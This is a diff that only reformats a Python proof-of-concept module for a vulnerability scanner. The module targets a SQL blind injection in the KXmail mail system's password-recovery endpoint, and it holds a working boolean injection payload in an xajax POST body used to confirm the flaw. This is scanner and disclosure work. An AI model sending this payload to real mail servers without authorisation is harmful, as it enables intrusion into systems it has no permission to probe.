@@ -3,6 +3,7 @@
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
     vuln_id = 'KXmail_0002'  # 平台漏洞编号，留空
     name = '科信邮件系统 SQL盲注'  # 漏洞名称
@@ -18,6 +19,7 @@ class Vuln(ABVuln):
     product = 'KXmail'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
 
+
 class Poc(ABPoc):
     poc_id = 'a0aecb6d-f5ef-4fd9-97b1-55588e09fdc7'
     author = '47bwy'  # POC编写者
@@ -31,7 +33,7 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
 
-            #ref: http://www.wooyun.org/bugs/wooyun-2010-065810
+            # ref: http://www.wooyun.org/bugs/wooyun-2010-065810
             hh = hackhttp.hackhttp()
             url = self.target + '/prog/get_passwd.server.php'
             postdata1 = "xjxfun=DoOperate&xjxr=1403400674828&xjxargs[]=<xjxobj><e><k>setup</k><v>S1</v></e><e><k>user</k><v>S<![CDATA[postmaster@111' or '1'='1]]></v></e></xjxobj>"
@@ -39,8 +41,8 @@ class Poc(ABPoc):
             code, head, res1, errcode, _ = hh.http(url, post=postdata1)
             code, head, res2, errcode, _ = hh.http(url, post=postdata2)
 
-            if code == 200 and '/prog/get_passwd_1.php'   in res1 and  '/prog/get_passwd_1.php' not in res2:
-                #security_warning(url)
+            if code == 200 and '/prog/get_passwd_1.php' in res1 and '/prog/get_passwd_1.php' not in res2:
+                # security_warning(url)
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
@@ -49,6 +51,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
